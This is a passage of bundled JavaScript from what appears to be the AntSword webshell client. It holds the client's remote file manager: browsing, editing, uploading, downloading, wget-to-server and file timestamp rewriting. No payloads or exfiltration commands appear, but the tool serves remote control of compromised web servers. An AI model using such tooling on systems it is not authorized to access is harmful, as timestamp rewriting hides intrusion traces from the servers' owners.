	            toastr.error(LANG['rename']['error'](ret === '0' ? false : ret), LANG_T['error']);
	          }
	        }, function (err) {
	          toastr.error(LANG['rename']['error'](err), LANG_T['error']);
	        });
	        layer.close(index);
	      });
	    }

	    // 新建目录

	  }, {
	    key: 'createFolder',
	    value: function createFolder() {
	      var _this7 = this;

	      layer.prompt({
	        value: LANG['createFolder']['value'],
	        title: '<i class="fa fa-folder"></i> ' + LANG['createFolder']['title']
	      }, function (value, i, e) {
	        _this7.files.cell.progressOn();
	        _this7.core.filemanager.mkdir({
	          path: _this7.path + value
	        }, function (ret) {
	          _this7.files.cell.progressOff();
	          if (ret === '1') {
	            _this7.files.refreshPath();
	            toastr.success(LANG['createFolder']['success'](value), LANG_T['success']);
	          } else {
	            toastr.error(LANG['createFolder']['error'](value, ret === '0' ? false : ret), LANG_T['error']);
	          }
	        }, function (err) {
	          toastr.error(LANG['createFolder']['error'](value, err), LANG_T['error']);
	        });
	        layer.close(i);
	      });
	    }

	    // 新建文件

	  }, {
	    key: 'createFile',
	    value: function createFile() {
	      var _this8 = this;

	      layer.prompt({
	        value: LANG['createFile']['value'],
	        title: '<i class="fa fa-file"></i> ' + LANG['createFile']['title']
	      }, function (value, i, e) {
	        _this8.files.cell.progressOn();
	        _this8.core.filemanager.create_file({
	          path: _this8.path + value,
	          content: '\0'
	        }, function (ret) {
	          _this8.files.cell.progressOff();
	          if (ret === '1') {
	            _this8.files.refreshPath();
	            toastr.success(LANG['createFile']['success'](value), LANG_T['success']);
	          } else {
	            toastr.error(LANG['createFile']['error'](value, ret === '0' ? false : ret), LANG_T['error']);
	          }
	        }, function (err) {
	          toastr.error(LANG['createFile']['error'](value, err), LANG_T['error']);
	        });
	        layer.close(i);
	      });
	    }

	    // 重命名文件/夹

	  }, {
	    key: 'retimeFile',
	    value: function retimeFile(name, oldtime) {
	      var _this9 = this;

	      layer.prompt({
	        value: oldtime,
	        title: '<i class="fa fa-clock-o"></i> ' + LANG['retime']['title'] + ' (' + name + ')',
	        content: '<input type="text" class="layui-layer-input" onClick="laydate({istime: true, format: \'YYYY-MM-DD hh:mm:ss\'});" value="' + oldtime + '">'
	      }, function (value, i, e) {
	        _this9.files.cell.progressOn();
	        _this9.core.filemanager.retime({
	          path: _this9.path + name,
	          time: value
	        }, function (ret) {
	          _this9.files.cell.progressOff();
	          if (ret === '1') {
	            _this9.files.refreshPath();
	            toastr.success(LANG['retime']['success'](name), LANG_T['success']);
	          } else {
	            toastr.error(LANG['retime']['error'](name, ret === '0' ? false : ret), LANG_T['error']);
	          }
	        }, function (err) {
	          toastr.error(LANG['retime']['error'](name, err), LANG_T['error']);
	        });
	        layer.close(i);
	      });
	    }

	    // 预览文件(图片、视频)

	  }, {
	    key: 'previewFile',
	    value: function previewFile(name) {
	      var path = this.path + name;
	      var win = this.createWin({
	        title: 'Preview File: ' + path
	      });
	      win.cell.lastChild['style']['overflow'] = 'scroll';
	      win.cell.lastChild['style']['textAlign'] = 'center';
	      var data = 'data:image/png;base64,';
	      var buff = '';
	      this.core.filemanager.download_file({
	        path: path
	      }, function (ret, buff) {
	        var imgData = new Buffer(buff).toString('base64');
	        win.attachHTMLString('<img src="data:/image/png;base64,' + imgData + '"/>');
	      }, function (err) {}, function (chunk) {
	        buff += chunk;
	        var imgData = data + new Buffer(buff).toString('base64');
	      });
	    }

	    // 下载文件

	  }, {
	    key: 'downloadFile',
	    value: function downloadFile(name, size) {
	      var _this10 = this;

	      var path = this.path + name;
	      var task = this.tasks.new(LANG['download']['task']['name'], path, LANG['download']['task']['wait']);
	      // 获取要保存的路径
	      dialog.showSaveDialog({
	        title: LANG['download']['title'],
	        defaultPath: name
	      }, function (filePath) {
	        if (!filePath) {
	          return task.end(LANG['download']['task']['cancel']);
	        };
	        task.update(LANG['download']['task']['start']);
	        // setTimeout(() => {
	        var down_size = 0;
	        _this10.core.filemanager.download_file({
	          path: path
	        }, function (ret, buff) {
	          // 保存文件
	          // fs.writeFileSync(filePath+'_bak', new global.Buffer(buff));
	          // 检测文件大小是否一致
	          if (buff.length === size) {
	            task.success(LANG['download']['task']['success']);
	            toastr.success(LANG['download']['success'](name), LANG_T['success']);
	          } else if (buff.length === 21) {
	            task.failed(buff.toString());
	          } else {
	            // task.failed(`FileSize(${buff.length} != ${size}`);
	            task.failed(LANG['download']['task']['error']('SizeErr: ' + buff.length + ' != ' + size));
	          }
	        }, function (err) {
	          task.failed(LANG['download']['task']['error'](err));
	          toastr.error(LANG['download']['error'](name, err), LANG_T['error']);
	        }, function (chunk) {
	          // 写入文件
	          fs.writeFileSync(filePath, new global.Buffer(chunk), {
	            flag: 'a'
	          });
	          // 计算进度百分比
	          down_size += chunk.length;
	          var down_progress = parseInt(parseFloat(down_size / size).toFixed(2) * 100);

	          if (!(down_progress % 5)) {
	            task.update(down_progress + '%');
	          };
	          // task.update(`${parseFloat(down_size/size).toFixed(0) * 100} %`);
	        });
	        // }, 200);
	      });
	    }

	    // wget文件

	  }, {
	    key: 'wgetFile',
	    value: function wgetFile() {
	      var _this11 = this;

	      var self = this;
	      var hash = +new Date();
	      // 获取URL
	      var _index = layer.prompt({
	        title: '<i class="fa fa-cloud-download"></i> ' + LANG['wget']['title'],
	        content: '<input type="text" style="width:300px;" class="layui-layer-input" id="url_' + hash + '" value="http://" placeholder="target url"><p/><input style="width:300px;" type="text" id="path_' + hash + '" class="layui-layer-input" value="' + self.path + '" placeholder="file name">',
	        btn: ['wget'],
	        yes: function yes(i) {

	          var _url = $('#url_' + hash);
	          var _path = $('#path_' + hash);

	          var url = _url.val();
	          var path = _path.val();

	          if (url.split('/').length < 4) {
	            _url.focus();
	            return toastr.warning(LANG['wget']['check'], LANG_T['warning']);
	          };
	          if (path.length < 1) {
	            return _path.focus();
	          };
	          var task = _this11.tasks.new(LANG['wget']['task']['name'], url + ' -> ' + path);
	          task.update(LANG['wget']['task']['start']);
	          _this11.core.filemanager.wget({
	            url: url,
	            path: path
	          }, function (ret) {
	            // 下载成功？当前目录？刷新：删除缓存
	            if (ret === '1') {
	              task.success(LANG['wget']['task']['success']);
	              var _ = path.substr(0, path.lastIndexOf('/') + 1);
	              _this11.files.refreshPath(_ === self.path ? false : _);
	            } else {
	              task.failed(LANG['wget']['task']['failed'](ret));
	            }
	          }, function (err) {
	            task.failed(LANG['wget']['task']['error'](err));
	          });
	          layer.close(i);
	        }
	      });
	      $('#layui-layer' + _index).css('width', '400px');
	    }

	    // 上传文件

	  }, {
	    key: 'uploadFile',
	    value: function uploadFile() {
	      var _this12 = this;

	      var path = this.path;
	      var tasks = {};
	      var upload = function upload(filePaths) {
	        if (!filePaths[0]) {
	          return false;
	        };
	        var filePath = filePaths[0];

	        var i = 0;
	        var buff = [];
	        // 数据分段上传，一次上传512kb=1024*512
	        var split = 1024 * 512;
	        var task = tasks[filePath];
	        // 获取文件名
	        var fileName = filePath.substr(filePath.lastIndexOf('/') + 1);
	        var fileBuff = void 0;
	        // 读取文件buffer
	        try {
	          fileBuff = fs.readFileSync(filePath);
	        } catch (e) {
	          return task.failed(e);
	        }

	        while (true) {
	          var _ = fileBuff.slice(i, i + split);
	          i += split;
	          if (_.length === 0) {
	            break;
	          };
	          buff.push(_);
	        }

	        var all_num = buff.length;
	        var upload_func = function upload_func(arr) {
	          if (!arr[0]) {
	            // 上传完毕
	            task.success('100%');
	            // 刷新目录
	            toastr.success(LANG['upload']['success'](fileName), LANG_T['success']);
	            // 刷新目录缓存
	            _this12.files.refreshPath(path === _this12.path ? '' : path);
	            return upload(filePaths);
	          };
	          // 更新进度条
	          task.update(parseInt((all_num - arr.length) / all_num * 100) + '%');
	          // 开始上传分段数据
	          _this12.core.filemanager.upload_file({
	            path: path + fileName,
	            content: arr[0]
	          }, function (ret) {
	            if (ret === '1') {
	              // 继续上传
	              arr.shift();
	              upload_func(arr);
	            } else {
	              task.failed(LANG['upload']['task']['failed'](ret));
	              toastr.error(LANG['upload']['error'](fileName, ret === '0' ? '' : '<br/>' + ret), LANG_T['error']);
	            }
	          }, function (err) {
	            task.failed(LANG['upload']['task']['error'](err));
	            toastr.error(LANG['upload']['error'](fileName, err), LANG_T['error']);
	          });
	        };

	        upload_func(buff);
	        filePaths.shift();
	      };
	      dialog.showOpenDialog({
	        properties: ['openFile', 'multiSelections']
	      }, function (filePaths) {
	        if (!filePaths) {
	          return;
	        };
	        // 逐个文件上传
	        filePaths.map(function (_) {
	          var fileName = _.substr(_.lastIndexOf('/') + 1);
	          tasks[_] = _this12.tasks.new(LANG['upload']['task']['name'], fileName + ' => ' + path, '准备上传..');
	        });
	        upload(filePaths);
	      });
	    }

	    // 编辑文件

	  }, {
	    key: 'editFile',
	    value: function editFile(name) {
	      var self = this;
	      var path = this.path + name;
	      var editor = null;
	      var codes = '';
	      // 创建窗口
	      var win = this.createWin({
	        title: LANG['editor']['title'](path),
	        width: 800
	      });
	      win.maximize();
	      win.progressOn();

	      // 检测文件后缀
	      var ext = name.substr(name.lastIndexOf('.') + 1);
	      var ext_dict = {
	        'php': 'php',
	        'c': 'c_cpp',
	        'cpp': 'c_cpp',
	        'h': 'c_cpp',
	        'coffee': 'coffee',
	        'cfm': 'coldfusion',
	        'css': 'css',
	        // 'ejs': 'ejs',
	        'go': 'golang',
	        'html': 'html',
	        'ini': 'ini',
	        'conf': 'ini',
	        'jade': 'jade',
	        'java': 'java',
	        'js': 'javascript',
	        'json': 'json',
	        'jsp': 'jsp',
	        'jsx': 'jsx',
	        'less': 'less',
	        'lua': 'lua',
	        'md': 'markdown',
	        'sql': 'sql',
	        'pl': 'perl',
	        'py': 'python',
	        'rb': 'ruby',
	        'sh': 'sh',
	        'txt': 'text',
	        'xml': 'xml'
	      };
	      if (!(ext in ext_dict)) {
	        ext = 'txt';
	      };
	      // 创建窗口工具栏
	      var toolbar = win.attachToolbar();
	      var _options = [];
	      for (var _ in ext_dict) {
	        var _ext = ext_dict[_];
	        var _opt = {
	          id: 'mode_' + _ext,
	          text: _ext + ' (.' + _ + ')',
	          icon: 'code',
	          type: 'button'
	        };
	        _ === ext ? _opt['selected'] = true : 0;
	        _options.push(_opt);
	      }
	      toolbar.loadStruct([{ id: 'save', type: 'button', icon: 'save', text: LANG['editor']['toolbar']['save'] }, { type: 'separator' }, { type: 'spacer' }, {
	        id: 'encode', type: 'buttonSelect', icon: 'language', openAll: true,
	        text: LANG['editor']['toolbar']['encode'],
	        options: function () {
	          var ret = [];
	          _encodes2.default.map(function (_) {
	            var _opt_ = {
	              id: 'encode_' + _,
	              text: _,
	              icon: 'font',
	              type: 'button'
	            };
	            _ === self.opts['encode'] ? _opt_['selected'] = true : 0;
	            ret.push(_opt_);
	          });
	          return ret;
	        }()
	      }, {
	        id: 'mode', type: 'buttonSelect', icon: 'th-list', openAll: true,
	        text: LANG['editor']['toolbar']['mode'],
	        options: _options
	      }]);
	      toolbar.attachEvent('onClick', function (id) {
	        if (id === 'save') {
	          // 保存代码
	          win.progressOn();
	          // self.ajax(
	          self.core.filemanager.create_file({
	            path: path,
	            content: editor.session.getValue() || '\0'
	          }, function (ret) {
	            win.progressOff();
	            if (ret === '1') {
	              toastr.success(LANG['editor']['success'](path), LANG_T['success']);
	              // 刷新目录（显示更改时间、大小等）
	              self.files.refreshPath();
	            } else {
	              toastr.error(LANG['editor']['error'](path, ret === '0' ? '' : '<br/>' + ret), LANG_T['error']);
	            }
	          });
	        } else if (id.startsWith('mode_')) {
	          var mode = id.split('_')[1];
	          editor.session.setMode('ace/mode/' + mode);
	        } else if (id.startsWith('encode_')) {
	          var encode = id.split('_')[1];
	          editor.session.setValue(iconv.encode(codes, encode).toString());
	        } else {
	          console.info('toolbar.onClick', id);
	        }
	      });

	      // 获取文件代码
	      this.core.filemanager.read_file({
	        path: path
	      }, function (ret) {
	        var _context;

	        codes = ret;
	        win.progressOff();

	        // 初始化编辑器
	        editor = ace.edit(win.cell.lastChild);
	        editor.$blockScrolling = Infinity;
	        editor.setTheme('ace/theme/tomorrow');
	        editor.session.setMode('ace/mode/' + ext_dict[ext]);
	        editor.session.setUseWrapMode(true);
	        editor.session.setWrapLimitRange(null, null);

	        editor.setOptions({
	          fontSize: '14px',
	          enableBasicAutocompletion: true,
	          enableSnippets: true,
	          enableLiveAutocompletion: true
	        });
	        // 编辑器快捷键
	        editor.commands.addCommand({
	          name: 'save',
	          bindKey: {
	            win: 'Ctrl-S',
	            mac: 'Command-S'
	          },
	          exec: function exec() {
	            toolbar.callEvent('onClick', ['save']);
	          }
	        });

	        editor.session.setValue(ret);

	        // 定时刷新
	        var inter = setInterval((_context = editor, editor.resize).bind(_context), 200);
	        win.attachEvent('onClose', function () {
	          clearInterval(inter);
	          return true;
	        });
	      }, function (err) {
	        toastr.error(LANG['editor']['loadErr'](err), LANG_T['error']);
	        win.close();
	      });
	    }

	    // 创建窗口

	  }, {
	    key: 'createWin',
	    value: function createWin(opts) {
	      var _id = String(Math.random()).substr(5, 10);
	      // 默认配置
	      var opt = $.extend({
	        title: 'Window:' + _id,
	        width: 660,
	        height: 550
	      }, opts);

	      // 创建窗口
	      var _win = this.win.createWindow(_id, 0, 0, opt['width'], opt['height']);
	      _win.setText(opt['title']);
	      _win.centerOnScreen();
	      _win.button('minmax').show();
	      _win.button('minmax').enable();

	      // 返回窗口对象
	      return _win;
	    }
	  }]);

	  return FileManager;
	}();

	exports.default = FileManager;
	/* WEBPACK VAR INJECTION */}.call(exports, (function() { return this; }()), __webpack_require__(5).Buffer))

/***/ },
/* 81 */
/***/ function(module, exports, __webpack_require__) {

	/* WEBPACK VAR INJECTION */(function(Buffer) {'use strict';

	Object.defineProperty(exports, "__esModule", {
	  value: true
	});

	var _createClass = function () { function defineProperties(target, props) { for (var i = 0; i < props.length; i++) { var descriptor = props[i]; descriptor.enumerable = descriptor.enumerable || false; descriptor.configurable = true; if ("value" in descriptor) descriptor.writable = true; Object.defineProperty(target, descriptor.key, descriptor); } } return function (Constructor, protoProps, staticProps) { if (protoProps) defineProperties(Constructor.prototype, protoProps); if (staticProps) defineProperties(Constructor, staticProps); return Constructor; }; }();

	function _classCallCheck(instance, Constructor) { if (!(instance instanceof Constructor)) { throw new TypeError("Cannot call a class as a function"); } }

	//
	// 文件管理 模块
	//

	var LANG_T = antSword['language']['toastr'];
	var LANG = antSword['language']['filemanager']['files'];

	var Files = function () {

	  // 需要参数
	  // 1.cell: 左侧layout.cell对象
	  // 2.manager 主对象（index.jsx）

	  function Files(cell, manager) {
	    _classCallCheck(this, Files);

	    var self = this;
	    cell.setText('<i class="fa fa-file-o"></i> ' + LANG['title']);
	    // 创建toolbar
	    var toolbar = cell.attachToolbar();
	    // 加载本地缓存书签栏
	    var bookmark = JSON.parse(manager.storage('bookmarks').get('{}'));
	    // 重新加载书签
	    this.reloadToolbar = function () {
	      var bookmark_opts = [{
	        id: 'bookmark_add',
	        type: 'button',
	        icon: 'plus-circle',
	        text: LANG['bookmark']['add'],
	        enabled: !bookmark[manager.path]
	      }];
	      if (!$.isEmptyObject(bookmark)) {
	        bookmark_opts.push({ type: 'separator' });
	      };
	      for (var _ in bookmark) {
	        bookmark_opts.push({
	          id: 'bookmark_' + _,
	          text: bookmark[_],
	          icon: 'bookmark-o',
	          type: 'button',
	          enabled: manager.path !== _
	        });
	      }
	      // 添加清除按钮
	      if (bookmark_opts.length > 2) {
	        bookmark_opts.push({
	          type: 'separator'
	        });
	        bookmark_opts.push({
	          id: 'bookmark_remove',
	          icon: 'remove',
	          text: LANG['bookmark']['del'],
	          type: 'button',
	          enabled: !!bookmark[manager.path]
	        });
	        bookmark_opts.push({
	          id: 'bookmark_clear',
	          icon: 'trash-o',
	          text: LANG['bookmark']['clear'],
	          type: 'button'
	        });
	      };

	      toolbar.clearAll();
	      toolbar.loadStruct([{
	        id: 'new', type: 'buttonSelect', icon: 'plus-circle', text: LANG['toolbar']['new'], openAll: true,
	        options: [{ id: 'new_folder', icon: 'folder-o', type: 'button', text: LANG['toolbar']['folder'] }, { id: 'new_file', icon: 'file-o', type: 'button', text: LANG['toolbar']['file'] }, { type: 'separator' }, { id: 'new_wget', icon: 'cloud-download', type: 'button', text: LANG['toolbar']['wget'] }, { id: 'new_upload', icon: 'cloud-upload', type: 'button', text: LANG['toolbar']['upload'] }]
	      }, { type: 'separator' }, { id: 'up', type: 'button', icon: 'arrow-up', text: LANG['toolbar']['up'] }, { type: 'separator' }, { id: 'refresh', type: 'button', icon: 'refresh', text: LANG['toolbar']['refresh'] }, { type: 'separator' }, { id: 'home', type: 'button', icon: 'home', text: LANG['toolbar']['home'] }, { type: 'separator' }, {
	        id: 'bookmark', type: 'buttonSelect', icon: 'bookmark', text: LANG['toolbar']['bookmark'], openAll: true,
	        options: bookmark_opts
	      }, { type: 'separator' }, { id: 'path', width: 300, type: 'buttonInput', value: manager.path || 'loading..' }, { id: 'read_path', type: 'button', icon: 'arrow-right', text: LANG['toolbar']['read'] }, { type: 'separator' }]);
	    };

	    this.reloadToolbar();
	    // reloadToolbar();
	    // this.reloadToolbar = reloadToolbar;
	    // toolbar点击事件
	    toolbar.attachEvent('onClick', function (id) {
	      switch (id) {
	        case 'up':
	          self.gotoPath('..');
	          break;
	        case 'refresh':
	          self.refreshPath();
	          break;
	        case 'read_path':
	          var pwd = toolbar.getInput('path').value;
	          self.gotoPath(pwd);
	          break;
	        case 'home':
	          self.gotoPath(manager.home);
	          break;
	        case 'new_folder':
	          manager.createFolder();
	          break;
	        case 'new_file':
	          manager.createFile();
	          break;
	        case 'new_wget':
	          manager.wgetFile();
	          break;
	        case 'new_upload':
	          manager.uploadFile();
	          break;
	        case 'bookmark_add':
	          // 添加书签
	          layer.prompt({
	            value: self.manager.path,
	            title: LANG['prompt']['add']['title']
	          }, function (value, i, e) {
	            bookmark[self.manager.path] = value;
	            self.manager.storage('bookmarks').set(JSON.stringify(bookmark));
	            toastr.success(LANG['prompt']['add']['success'](self.manager.path), LANG_T['success']);
	            self.reloadToolbar();
	            layer.close(i);
	          });
	          break;
	        case 'bookmark_remove':
	          layer.confirm(LANG['prompt']['remove']['confirm'], {
	            icon: 2, shift: 6,
	            title: '<i class="fa fa-remove"></i> ' + LANG['prompt']['remove']['title']
	          }, function (_) {
	            // 删除书签并刷新
	            delete bookmark[self.manager.path];
	            self.manager.storage('bookmarks').set(JSON.stringify(bookmark));
	            self.reloadToolbar();
	            toastr.success(LANG['prompt']['remove']['success'], LANG_T['success']);
	            layer.close(_);
	          });
	          break;
	        case 'bookmark_clear':
	          layer.confirm(LANG['prompt']['clear']['confirm'], {
	            icon: 2, shift: 6,
	            title: '<i class="fa fa-trash-o"></i> ' + LANG['prompt']['clear']['title']
	          }, function (_) {
	            bookmark = {};
	            self.manager.storage('bookmarks').set('{}');
	            self.reloadToolbar();
	            toastr.success(LANG['prompt']['clear']['success'], LANG_T['success']);
	            layer.close(_);
	          });
	          break;
	        default:
	          var arr = id.split('_');
	          if (arr.length === 2 && arr[0] === 'bookmark') {
	            self.gotoPath(arr[1]);
	          };
	      }
	    });
	    toolbar.attachEvent('onEnter', function (id, value) {
	      switch (id) {
	        case 'path':
	          self.gotoPath(value);
	          break;
	      }
	    });
	    // 创建grid
	    var grid = cell.attachGrid();

	    grid.setHeader('\n      &nbsp;,\n      ' + LANG['grid']['header']['name'] + ',\n      ' + LANG['grid']['header']['time'] + ',\n      ' + LANG['grid']['header']['size'] + ',\n      ' + LANG['grid']['header']['attr'] + '\n    ');
	    grid.setColTypes("ro,ro,ro,ro,ro");
	    grid.setColSorting('str,str,str,str,str');
	    grid.setInitWidths("40,*,150,100,100");
	    grid.setColAlign("center,left,left,right,center");
	    grid.enableMultiselect(true);
	    // grid.enableMultiline(true);

	    // grid右键
	    // 空白数据右键fix
	    $('.objbox').on('contextmenu', function (e) {
	      e.target.nodeName === 'DIV' && grid.callEvent instanceof Function && antSword['tabbar'].getActiveTab().startsWith('tab_filemanager_') ? grid.callEvent('onRightClick', [-1, -1, e]) : null;
	    });
	    $('.objbox').on('click', function (e) {
	      bmenu.hide();
	    });
	    grid.attachEvent('onRightClick', function (id, lid, event) {
	      var _this = this;

	      // 获取选中ID列表
	      var _ids = (this.getSelectedId() || '').split(',');
	      // 如果是空白右键
	      if (id === -1) {
	        _ids = [];
	      }
	      // 如果没有选中？则选中右键对应选项
	      else if (_ids.length === 1) {
	          this.selectRowById(id);
	          _ids = [id];
	        };
	      var ids = [];
	      _ids.map(function (_) {
	        ids.push(_this.getRowAttribute(_, 'fname'));
	      });
	      id = ids[0] || '';

	      // 获取剪贴板内容
	      var _Clipboard = [];
	      var _Clipboard_num = 0;
	      for (var c in self.Clipboard) {
	        _Clipboard.push({
	          text: c,
	          icon: 'fa fa-' + (c.endsWith('/') ? 'folder-o' : 'file-o'),
	          action: function (source, name) {
	            return function () {
	              manager.pasteFile(source, name);
	            };
	          }(self.Clipboard[c], c)
	        });
	        _Clipboard_num++;
	        if (!(_Clipboard_num % 5)) {
	          _Clipboard.push({ divider: true });
	        };
	      }
	      // 清除最后的divider
	      // if (_Clipboard.length % 5 && _Clipboard_num > 5) { _Clipboard.pop() };
	      // all item
	      if (_Clipboard.length > 0) {
	        _Clipboard.unshift({ divider: true });
	        _Clipboard.unshift({
	          text: LANG['grid']['contextmenu']['paste']['all'],
	          count: _Clipboard_num,
	          icon: 'fa fa-th-list',
	          action: function action() {
	            _Clipboard.map(function (c) {
	              if (c['divider'] || c['count'] || c['text'] === LANG['grid']['contextmenu']['paste']['clear']['title']) {
	                return;
	              };

	              var name = c['text'];
	              var source = self.Clipboard[name];

	              manager.pasteFile(source, name);
	            });
	          }
	        });
	        // 清空剪贴板
	        !_Clipboard[_Clipboard.length - 1].divider ? _Clipboard.push({ divider: true }) : 0;
	        _Clipboard.push({
	          text: LANG['grid']['contextmenu']['paste']['clear']['title'],
	          icon: 'fa fa-trash-o',
	          action: function action() {
	            self.Clipboard = {};
	            toastr.info(LANG['grid']['contextmenu']['paste']['clear']['info'], LANG_T['info']);
	          }
	        });
	      };

	      var isFolder = id.endsWith('/');
	      // 可编辑文件后缀
	      var isEdited = false;
	      'php,asp,aspx,jsp,cfm,js,css,html,py,sh,bat,txt,log,ini,conf,sql'.split(',').map(function (e) {
	        id.toLowerCase().endsWith('.' + e) ? isEdited = true : 0;
	      });
	      // 可预览文件后缀
	      var isPreviewed = false;
	      'jpg,png,gif,bmp,ico,mp4,mp3,wav,avi,rmvb'.split(',').map(function (e) {
	        id.toLowerCase().endsWith('.' + e) ? isPreviewed = true : 0;
	      });

	      var menu = [{ text: LANG['grid']['contextmenu']['refresh'], icon: 'fa fa-refresh', action: function action() {
	          self.refreshPath();
	        } }, { divider: true }, { text: LANG['grid']['contextmenu']['wget'], icon: 'fa fa-cloud-download', action: manager.wgetFile.bind(manager) }, { text: LANG['grid']['contextmenu']['upload'], icon: 'fa fa-upload', action: manager.uploadFile.bind(manager) }, { text: LANG['grid']['contextmenu']['download'], icon: 'fa fa-download', disabled: isFolder || !id || ids.length > 1, action: function action() {
	          manager.downloadFile(id, _this.getRowAttribute(_ids[0], 'fsize'));
	        } }, { divider: true }, { text: LANG['grid']['contextmenu']['copy']['title'], icon: 'fa fa-copy', disabled: !id, action: function action() {
	          // 如果只有一个id，则显示id名称，否则显示ids数量
	          ids.map(function (id) {
	            var path = manager.path + id;
	            // 判断是否已经复制
	            if (id in self.Clipboard) {
	              return toastr.warning(LANG['grid']['contextmenu']['copy']['warning'](id), LANG_T['warning']);
	            };
	            self.Clipboard[id] = path;
	            toastr.info(LANG['grid']['contextmenu']['copy']['info'](id), LANG_T['info']);
	          });
	        } }, { text: LANG['grid']['contextmenu']['paste']['title'], icon: 'fa fa-paste', disabled: _Clipboard_num === 0, subMenu: _Clipboard },
	      // { text: LANG['grid']['contextmenu']['preview'], icon: 'fa fa-eye', disabled: !id || ids.length > 1 || !isPreviewed, action: () => {
	      //   manager.previewFile(id);
	      // } },
	      { divider: true }, { text: LANG['grid']['contextmenu']['edit'], icon: 'fa fa-edit', disabled: /*!isEdited || */!id || ids.length > 1 || isFolder, action: function action() {
	          manager.editFile(id);
	        } }, { text: LANG['grid']['contextmenu']['delete'], icon: 'fa fa-trash-o', disabled: !id, action: function action() {
	          manager.deleteFile(ids);
	        } }, { text: LANG['grid']['contextmenu']['rename'], icon: 'fa fa-font', disabled: !id || ids.length > 1, action: function action() {
	          manager.renameFile(id);
	        } }, { text: LANG['grid']['contextmenu']['modify'], icon: 'fa fa-clock-o', disabled: !id || ids.length > 1, action: function action() {
	          // manager.retimeFile(id, this.rowsAr[id]['cells'][2].innerText);
	          manager.retimeFile(id, _this.getRowAttribute(_ids[0], 'data')[2]);
	        } }, { divider: true }, { text: LANG['grid']['contextmenu']['create']['title'], icon: 'fa fa-plus-circle', subMenu: [{ text: LANG['grid']['contextmenu']['create']['folder'], icon: 'fa fa-folder-o', action: manager.createFolder.bind(manager) }, { text: LANG['grid']['contextmenu']['create']['file'], icon: 'fa fa-file-o', action: manager.createFile.bind(manager) }] }];

	      bmenu(menu, event);

	      return true;
	    });

	    // 选择事件
	    grid.attachEvent('onRowSelect', function (id, lid, event) {
	      bmenu.hide();
	    });

	    // 双击::列出数据&&查看/编辑/下载文件(支持查看程序(png|jpg|gif..)则查看
	    //支持编辑文件(php,js,txt..)则启动编辑器，如果是二进制或压缩等文件(exe,dll,zip,rar..)则下载)
	    grid.attachEvent('onRowDblClicked', function (id, lid, event) {
	      var fname = grid.getRowAttribute(id, 'fname');
	      if (!fname.endsWith('/')) {
	        // grid.callEvent('onRightClick', [id, lid, event]);
	      } else {
	          self.gotoPath(fname);
	        }
	    });

	    grid.init();

	    this.grid = grid;
	    this.cell = cell;
	    this.toolbar = toolbar;
	    this.manager = manager;

	    // 剪贴板
	    this.Clipboard = {};
	  }

	  // 刷新当前目录
	  // 如果传递路径参数，则刷新该路径下的文件，不跳转，否则刷新&&跳转


	  _createClass(Files, [{
	    key: 'refreshPath',
	    value: function refreshPath(p) {
	      var path = p || this.manager.path;
	      // delete this.manager.cache[path];
	      this.manager.cache.del('filemanager-files-' + new Buffer(path).toString('base64'));
	      // 删除文件夹缓存
	      for (var _ in this.manager.folder.cache) {
	        if (_.indexOf(path) === 0 && _ != path) {
	          delete this.manager.folder.cache[_];
	        }
	      }
	      if (!p) {
	        this.gotoPath('.');
	      };
	    }

	    // 跳转目录

	  }, {
	    key: 'gotoPath',
	    value: function gotoPath(path) {
	      var self = this;
	      this.cell.progressOn();
	      try {
	        this.manager.getFiles(path, function (files) {
	          self.parse(files);
	          self.manager.folder.parse(files);
	          // self.cell.progressOff();
	        });
	      } catch (e) {
	        toastr.error(e, LANG_T['error']);
	        self.cell.progressOff();
	      }
	    }

	    // 解析数据

	  }, {
	    key: 'parse',
	    value: function parse(files) {

	      var data = [];
	      var self = this;
	      var _id = 1;
	      files.map(function (file) {
	        if (!file['name'] || ['./', '../'].indexOf(file['name']) != -1) {
	          return;
	        };
	        data.push({
	          id: _id,
	          fname: file['name'],
	          fsize: parseInt(file['size']),
	          data: [self.fileIcon(file['name']), file['name'].replace(/\/$/, ''), file['time'], self.fileSize(parseInt(file['size'])), file['attr']]
	        });
	        _id++;
	      });

	      this.cell.setText('<i class="fa fa-file-o"></i> ' + LANG['title'] + ' (' + data.length + ')');
	      this.grid.clearAll();
	      this.grid.parse({
	        'rows': data
	      }, 'json');

	      // 设置path路径
	      this.toolbar.getInput('path').value = this.manager.path;

	      this.cell.progressOff();
	      this.reloadToolbar();
	    }

	    // 文件大小计算

	  }, {
	    key: 'fileSize',
	    value: function fileSize(t) {
	      var i = false;
	      var b = ["b", "Kb", "Mb", "Gb", "Tb", "Pb", "Eb"];
	      for (var q = 0; q < b.length; q++) {
	        if (t > 1024) t = t / 1024;else if (i === false) i = q;
	      }if (i === false) i = b.length - 1;
	      return Math.round(t * 100) / 100 + " " + b[i];
	    }

	    // 返回文件图标

	  }, {
	    key: 'fileIcon',
	    value: function fileIcon(name) {
	      var icons = {};
	      var _icons = {
	        'exe,dll': 'file',
	        'jpg,png,gif,ico,bmp': 'file-image-o',
	        'mp4,mpeg,avi,rm,rmvb': 'file-movie-o',
	        'mp3,mid,wav': 'file-sound-o',
	        'pdf': 'file-pdf-o',
	        'ppt': 'file-powerpoint-o',
	        'xls,xlsx': 'file-excel-o',
	        'doc,docx': 'file-word-o',
	        'zip,tar,7z,gz,rar': 'file-archive-o',
	        'txt,ttf,tiff,ini,log,chm,conf,cfg': 'file-text-o',
	        'php,asp,jsp,sql,cfm,aspx,html,js,py,rb,pl,go,css,less,jsx,sass,xml,sh,bat,h,cpp,c,m': 'file-code-o'
	      };

	      var _loop = function _loop(_) {
	        var _arr = _.split(',');
	        _arr.map(function (a) {
	          icons[a] = _icons[_];
	        });
	      };

	      for (var _ in _icons) {
	        _loop(_);
	      }
	      // 默认图标
	      var icon = 'file-o';
	      // 判断是否为文件夹
	      if (name.endsWith('/')) {
	        icon = 'folder-o';
	      } else {
	        var _2 = name.split('.');
	        var ext = _2[_2.length - 1].toLowerCase();
	        icon = icons[ext] || icon;
	      };
	      return '<i class="fa fa-' + icon + ' fa-lg"></i>';
	    }
	  }]);

	  return Files;
	}();

	exports.default = Files;
	/* WEBPACK VAR INJECTION */}.call(exports, __webpack_require__(5).Buffer))

/***/ },
/* 82 */
/***/ function(module, exports) {

	'use strict';

	Object.defineProperty(exports, "__esModule", {
	  value: true
	});

